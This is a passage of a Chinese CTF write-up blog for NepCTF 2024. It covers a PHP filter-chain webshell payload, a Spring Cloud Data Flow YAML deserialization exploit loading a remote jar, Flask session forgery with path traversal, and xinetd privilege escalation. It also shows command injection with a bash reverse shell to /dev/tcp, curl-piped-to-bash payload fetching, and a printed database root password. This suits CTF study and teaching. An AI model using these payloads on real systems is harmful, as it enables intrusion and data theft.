iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>放到 <code>1</code>里面发送过去，即可写马成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240824164035342.png" alt="image-20240824164035342"></p>
<p>查看 <code>env</code> 得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240824164104211.png" alt="image-20240824164104211"></p>
<h2 id="Always-RCE-First"><a href="#Always-RCE-First" class="headerlink" title="Always RCE First"></a>Always RCE First</h2><p>一个漏洞复现</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://forum.butian.net/article/513">Spring Cloud Data Flow 漏洞分析（CVE-2024-22263|CVE-2024-37084）</a></p>
<p>按照文件的操作，先创建一个<code>package.yaml</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="number">1.0</span><span class="number">.0</span></span><br><span class="line"><span class="attr">origin:</span> <span class="string">my</span> <span class="string">origin</span></span><br><span class="line"><span class="attr">repositoryId:</span> <span class="number">12345</span></span><br><span class="line"><span class="attr">repositoryName:</span> <span class="string">local</span></span><br><span class="line"><span class="attr">kind:</span> <span class="type">!!javax.script.ScriptEngineManager</span> [<span class="type">!!java.net.URLClassLoader</span> [[<span class="type">!!java.net.URL</span> [<span class="string">&quot;http://xxx/yaml-payload.jar&quot;</span>]]]]</span><br><span class="line"><span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">1.1</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>

<p>然后创建一个<code>test-1.1.1</code>，一起压缩进一个压缩包</p>
<p>接着用脚本转换得到 <code>packageFileAsBytes</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">zip_to_byte_list</span>(<span class="params">zip_file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(zip_file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        zip_data = file.read()</span><br><span class="line">    <span class="keyword">return</span> [byte <span class="keyword">for</span> byte <span class="keyword">in</span> zip_data]</span><br><span class="line"></span><br><span class="line">zip_file_path = <span class="string">&#x27;test-1.1.1.zip&#x27;</span></span><br><span class="line">zip_byte_list = zip_to_byte_list(zip_file_path)</span><br><span class="line"><span class="built_in">print</span>(zip_byte_list)</span><br></pre></td></tr></table></figure>

<p>接着在这个 <a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">项目</a> 下载源码并修改，修改完成后打包成jar包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>

<p>把 jar包放服务器，并用python启动一个http服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 2333</span><br></pre></td></tr></table></figure>

<p>发包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240824213816687.png" alt="image-20240824213816687"></p>
<p>反弹shell成功，直接读flag即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240824212528847.png" alt="image-20240824212528847"></p>
<h2 id="蹦蹦炸弹（boom-it）"><a href="#蹦蹦炸弹（boom-it）" class="headerlink" title="蹦蹦炸弹（boom_it）"></a>蹦蹦炸弹（boom_it）</h2><p>审计源码，可以看到在<code>/admin/dashboard</code> 路由下可以<code>RCE</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/dashboard&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;admin_logged_in&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;admin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No selected file&#x27;</span></span><br><span class="line">        filename = file.filename</span><br><span class="line">        file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;File uploaded successfully&#x27;</span></span><br><span class="line"></span><br><span class="line">    cmd_output = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;cmd&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">&quot;lock.txt&quot;</span>):  <span class="comment"># 检查当前目录下是否存在lock.txt</span></span><br><span class="line">            cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cmd_output = subprocess.check_output(cmd, shell=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                cmd_output = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cmd_output = <span class="string">&quot;lock.txt not found. Command execution not allowed.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin_dashboard.html&#x27;</span>, users=users, cmd_output=cmd_output, active_tab=<span class="string">&quot;cmdExecute&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在次之前，要先保证<code>session.get(&#39;admin_logged_in&#39;)</code>成立，发现源码已经给了<code>app.secret_key = &quot;super_secret_key&quot;</code>，那么可以直接 <code>session伪造</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;username&#x27;: &#x27;HRP&#x27;,&#x27;admin_logged_in&#x27;: true&#125;</span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -s super_secret_key -t &quot;&#123;&#x27;username&#x27;: &#x27;HRP&#x27;,&#x27;admin_logged_in&#x27;: True&#125;&quot;</span><br><span class="line"></span><br><span class="line">eyJ1c2VybmFtZSI6IkhSUCIsImFkbWluX2xvZ2dlZF9pbiI6dHJ1ZX0.Zsnvog.93hWSohyVwbqbd_9ZWvkmuhrBHg</span><br></pre></td></tr></table></figure>

<p>然后用一个前端上传文件，抓包，修改上传文件名为<code>../../lock.txt</code>，并带上 Cookie</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825182446670.png" alt="image-20240825182446670"></p>
<p>上传成功后，即可<code>RCE</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825182535622.png" alt="image-20240825182535622"></p>
<p>反弹shell，然后发现<code>flag</code>没权限读取</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825183146806.png" alt="image-20240825183146806"></p>
<p>查看进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -axu</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825183221657.png" alt="image-20240825183221657"></p>
<p>再结合提示，观察有哪些应用是 root 启动的，可以看到一个<code>/usr/sbin/xinetd</code></p>
<p>去查找它对应配置文件的位置（拷打GPT）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825183427921.png" alt="image-20240825183427921"></p>
<p>查看<code>etc/xinetd.d/</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825183531028.png" alt="image-20240825183531028"></p>
<p>可以看到<code>pwnservice</code>有写入的权限，查看<code>pwnservice</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825183633124.png" alt="image-20240825183633124"></p>
<p>可以看到是通过<code>8888</code>端口建立了连接</p>
<p>这里可以通过修改<code>pwnservice</code>的<code>server_args = -c &quot;/home/ctfuser/start.sh&quot;</code>为<code>/bin/sh</code>，nc连接上就是root，也可以像我这样修改<code>/home/ctfuser/start.sh</code>，我们也有<code>/home/ctfuser/start.sh</code>的写权限</p>
<p>修改<code>/home/ctfuser/start.sh</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;;chmod 777 /home/ctfuser/*&quot; &gt;&gt; /home/ctfuser/start.sh</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825183956397.png" alt="image-20240825183956397"></p>
<p>然后建立与<code>8888</code>端口的<code>socket</code>连接，让脚本执行。</p>
<p>用python建立 socket 连接 （也可以用nc，一开始没注意到）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import socket;sock = socket.socket();sock.connect((&#x27;127.0.0.1&#x27;, 8888));&quot;</span><br><span class="line"></span><br><span class="line">nc 127.0.0.1 8888</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825184136904.png" alt="image-20240825184136904"></p>
<p>成功获得<code>flag</code>的读取权限，直接查看即可得到flag</p>
<h2 id="NepRouter"><a href="#NepRouter" class="headerlink" title="NepRouter"></a>NepRouter</h2><h3 id="NepRouter-狸猫换太子"><a href="#NepRouter-狸猫换太子" class="headerlink" title="NepRouter-狸猫换太子"></a>NepRouter-狸猫换太子</h3><p>按照要求建立好连接（</p>
<p>我这里是用 bp 来代理的，后边都是用 bp 的内置浏览器做题</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825190334160.png" alt="image-20240825190334160"></p>
<p>先把执行一次注册+登陆的操作</p>
<p>随便上传一个文件，之后成功注册<code>TEST</code>用户，然后登陆上去。</p>
<p>点击<code>Download Now</code> 能下载下来一个文件，</p>
<p>同时点进<code>/about</code>，通过审查源码，发现有一个<code>8080</code>端口。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825190558492.png" alt="image-20240825190558492"></p>
<p>这里就会出现一个问题，如果直接访问<code>8080</code>，会报<code>Burp Suite Professional</code>，因为<code>bp</code>占用了<code>8080</code>端口，需要修改一下 bp 的监听端口</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825190800692.png" alt="image-20240825190800692"></p>
<p>在这里将 8080 改成 8081，接着回到浏览器，访问<code>127.0.0.1:8080</code>，来到一个新页面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825191313445.png" alt="image-20240825191313445"></p>
<p>接着分析下载下来的文件，用 ida 分析</p>
<p>翻看到<code>sub_1ACE</code>函数，可以看到一个用户名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825191526205.png" alt="image-20240825191526205"></p>
<p>那么接下来应该要伪造这个用户。</p>
<p>接着回到 <code>5000</code> 端口的网站，翻看 BP 的历史访问记录，可以看到在点击注册时，会发送一个加密后的用户名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825191753174.png" alt="image-20240825191753174"></p>
<p>重新回到发送<code>register</code>前，观察前端，发现当我们上传完文件后，前端会出现一个<code>TEST</code>，再次点击注册，就会注册成功<code>TEST</code>用户，猜测它加密时用的字符串是从这个位置取的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825192008292.png" alt="image-20240825192008292"></p>
<p>修改前端，把 <code>TEST</code> 改成 <code>NepNepIStheBestTeam</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825192051064.png" alt="image-20240825192051064"></p>
<p>然后再点<code>Register</code>，注册成功后发现能用这个账号登陆，说明我们可以通过修改前端改数据</p>
<p>接着来到<code>8080</code>的网站，用 <code>NepNepIStheBestTeam</code> 登陆，可以登陆上网页</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825192414944.png" alt="image-20240825192414944"></p>
<p>这里有一个填地址的地方，抓一下这里的包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825193247286.png" alt="image-20240825193247286"></p>
<p>可以看到是请求了<code>/setrouter</code>路由，对应上<code>router</code> 中的<code>sub_1E91</code>逻辑</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825193450287.png" alt="image-20240825193450287"></p>
<p>可以看到最后是走到了一个<code>sub_1979</code>，点进去查看，发现可以 RCE</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825193546560.png" alt="image-20240825193546560"></p>
<p>用<code>curl</code>探测一下，发现能够出网带出数据，这里有一点小坑就是，请求的参数里不能有空格，可以用<code>$&#123;IFS&#125;</code>来代替空格</p>
<p>导致这个现象发生是因为这里</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825193754755.png" alt="image-20240825193754755"></p>
<p>这里用了空格作为分割符来分割字符串，如果我们传进去的参数带有空格就会被分割了，从而丢掉了空格后边的数据</p>
<p>探测出网：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/setrouter?ip_address=123;curl$&#123;IFS&#125;xxxx:2333</span><br></pre></td></tr></table></figure>

<p>vps 收到了数据</p>
<p>接着反弹shell，同上面的原因，一样不能使用<code>&amp;</code>这个字符，我是使用<code>curl</code>来执行远程的<code>bash</code>文件</p>
<p>vps用户python启动一个http</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 2334</span><br></pre></td></tr></table></figure>

<p>sh里写反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/xxx/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>接着靶机执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/setrouter?ip_address=123;curl$&#123;IFS&#125;xxxx:2334/sh|bash</span><br></pre></td></tr></table></figure>

<p>成功弹上shell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825194657450.png" alt="image-20240825194657450"></p>
<p>直接 <code>cat README.txt</code>，得到flag1</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825194740404.png" alt="image-20240825194740404"></p>
<h3 id="NepRouter-白给"><a href="#NepRouter-白给" class="headerlink" title="NepRouter-白给"></a>NepRouter-白给</h3><p>查看进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -axu</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825194908032.png" alt="image-20240825194908032"></p>
<p>收集到一些信息：</p>
<p><code>blood-pool-HRP</code> 运行在 <code>9999</code> 端口，浏览器访问验证一下发现能访问</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825195053328.png" alt="image-20240825195053328"></p>
<p>此时可以看到，这里需要我们输入<code>flag</code>，把程序扒下来看一下。</p>
<p>先cd 到 <code>/blood-pool</code> ，然后看一下有什么</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825195259416.png" alt="image-20240825195259416"></p>
<p>发现有一个<code>flag.txt</code>，但没权限读，<code>ssh.txt</code>里面是一个用户</p>
<p>熟悉的操作，在靶机用python启动一个<code>http</code>服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 9998</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825195431476.png" alt="image-20240825195431476"></p>
<p>然后把 <code>blood-pool-HRP</code> 下载下来</p>
<p>接着把python服务终止掉，重新反弹shell</p>
<p>反编译程序，可以发现<code>flag</code>是从数据库中查的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240826060416711.png" alt="image-20240826060416711"></p>
<p>在<code>main_initDB</code>中可以看到数据库名<code>TradeSecrets</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240826060327422.png" alt="image-20240826060327422"></p>
<p>接着查数据库，直接用<code>mysql</code>查不了，可以用python连数据库查</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import mysql.connector;DB_CONFIG = &#123;&#x27;host&#x27;: &#x27;localhost&#x27;,&#x27;user&#x27;: &#x27;root&#x27;,&#x27;password&#x27;: &#x27;Nep+-*/HRP123456789&#x27;,&#x27;database&#x27;:&#x27;TradeSecrets&#x27;&#125;;db = mysql.connector.connect(**DB_CONFIG);cursor = db.cursor();cursor.execute(&#x27;select * from flag&#x27;);res = cursor.fetchone();print(res);cursor.close();db.close()&quot;</span></span><br></pre></td></tr></table></figure>

<p>最终得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NepCTF&#123;U_GET_THE_TWO_IT_IS_EASY_NO_RIGHT?&#125;</span><br></pre></td></tr></table></figure>



<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="NepMagic-——-CheckIn"><a href="#NepMagic-——-CheckIn" class="headerlink" title="NepMagic —— CheckIn"></a>NepMagic —— CheckIn</h2><p>认真玩游戏即可得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240824165934829.png" alt="image-20240824165934829"></p>
<h2 id="Nemophila"><a href="#Nemophila" class="headerlink" title="Nemophila"></a>Nemophila</h2><p>先看<code>mimi.py</code>，通过分析可以得到<code>key</code></p>
<p>源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;这里有一个藏宝室，镇守着一个宝箱怪，当你说出正确的口令时，你也就快获得了这个屋子里最至高无上的宝物。&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;提示：宝箱怪只会提示你口令正确与否，请你试试吧！&quot;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Turn in your guess: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) !=<span class="number">48</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;长度不对！&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(flag.capitalize()[<span class="number">0</span>]) != <span class="number">83</span> <span class="keyword">or</span> <span class="keyword">not</span> flag[<span class="number">0</span>].islower():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please try again!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[-<span class="number">3</span>:] != <span class="string">&quot;ve&#125;&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please try again!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag.count(<span class="built_in">chr</span>(<span class="number">95</span>)) != <span class="number">4</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please try again!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span 